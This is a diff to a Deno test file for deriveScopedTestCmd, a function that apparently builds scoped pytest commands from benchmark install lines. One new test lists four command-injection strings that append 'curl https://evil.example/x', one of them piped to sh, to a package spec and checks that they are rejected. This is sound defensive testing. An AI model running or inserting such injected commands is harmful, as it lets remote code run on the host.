@@ -15,7 +15,7 @@
  * @related-files [scripts/ingest_terminal_bench.ts, tests/scenario_framework/runner/synthetic_runner.ts]
  */
 
-import { assert, assertEquals } from "@std/assert";
+import { assert, assertEquals, assertThrows } from "@std/assert";
 import { deriveScopedTestCmd } from "../../scripts/ingest_terminal_bench.ts";
 
 Deno.test("[DeriveScopedTestCmd] never references $HOME or $PATH — the scenario framework's expandInString would substitute the HOST's value, not the container's", () => {
@@ -42,4 +42,31 @@ Deno.test("[DeriveScopedTestCmd] falls back to the default package spec when run
 Deno.test("[DeriveScopedTestCmd] runs pytest against the hidden oracle-tests mount", () => {
   const cmd = deriveScopedTestCmd("uv pip install pytest==8.4.1\n");
   assertEquals(cmd.includes("pytest /oracle_tests/test_outputs.py -rA"), true);
+});
+
+Deno.test("[DeriveScopedTestCmd] a backslash-continued multi-line uv pip install block extracts the full package list, not just the first line", () => {
+  const cmd = deriveScopedTestCmd(
+    "uv pip install pytest==8.4.1 \\\n  pandas==2.2.0 \\\n  numpy==1.26.0\nmore setup\n",
+  );
+  assert(
+    cmd.includes("uv pip install -q pytest==8.4.1 pandas==2.2.0 numpy==1.26.0"),
+    `must capture the full continued package list, not truncate at the first physical line: ${cmd}`,
+  );
+});
+
+Deno.test("[DeriveScopedTestCmd] rejects an install line containing shell metacharacters rather than silently interpolating it", () => {
+  for (
+    const malicious of [
+      "pytest==8.4.1; curl https://evil.example/x | sh",
+      "pytest==8.4.1 && curl https://evil.example/x",
+      "pytest==8.4.1 `curl https://evil.example/x`",
+      "pytest==8.4.1 $(curl https://evil.example/x)",
+    ]
+  ) {
+    assertThrows(
+      () => deriveScopedTestCmd(`uv pip install ${malicious}\n`),
+      Error,
+      "rejected upstream package spec",
+    );
+  }
 });
